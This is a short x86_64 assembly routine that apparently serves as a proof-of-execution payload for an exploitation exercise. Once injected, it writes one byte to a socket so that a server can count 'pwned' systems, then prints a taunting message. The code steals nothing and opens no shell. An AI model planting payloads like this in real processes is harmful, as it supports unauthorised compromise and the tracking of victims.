# x86_64, GAS syntax

_pwned:
    push %rdi
    
    # write to the socket to show we executed the code - the S from Systems
    # will do. Don't worry about using send instead of write.

    # From Linux manpages 4.04, syscall(2)
    # syscall number in %rax (write)
    mov $1, %rax

    # argument 1 in %rdi (the file descriptor used to download - passed in %rdi
    # already, so no need to do anything here)

    # argument 2 in %rsi (the first byte from the text, position-relative)
    lea text(%rip), %rsi

    # argument 3 in %rdx (1 byte)
    mov $1, %rdx

    syscall

    # the server will now increment its count of pwned systems

    # Print out the last count.

    # syscall number in %rax (write)
    mov $1, %rax

    # argument 1 in %rdi (stdout)
    mov $1, %rdi

    # argument 2 in %rsi (the text, position-relative)
    lea text(%rip), %rsi

    # argument 3 in %rdx (the length of the text)
    mov $(text_end - text), %rdx

    # call the kernel!
    syscall

    # cleanup and return
    pop %rdi
    ret
text:
    .ascii "Systems pwn3d: 00000000 -- plus you.\n\0"
text_end:
padding:
    .align 65536, 0
